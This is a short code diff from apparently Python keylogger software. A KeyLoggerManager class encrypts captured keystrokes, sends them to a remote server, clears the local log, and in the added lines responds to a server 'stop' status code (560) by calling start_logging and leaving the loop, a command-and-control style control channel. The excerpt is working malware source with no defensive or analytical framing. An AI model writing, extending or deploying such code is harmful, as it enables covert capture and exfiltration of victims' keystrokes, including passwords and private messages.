@@ -75,6 +75,9 @@ class KeyLoggerManager:
                     status_code: int = NetworkWriter.send_data(encrypted_data)
                     print(status_code)
                     key_logger.clear_log()  # Clear log after successful transmission
+                    if status_code == 560: # when the server send stop status code
+                        key_logger.start_logging()
+                        break
                 except Exception as e:
                     last_error: str = f"Failed to send data at {timestamp}: {str(e)}"
 
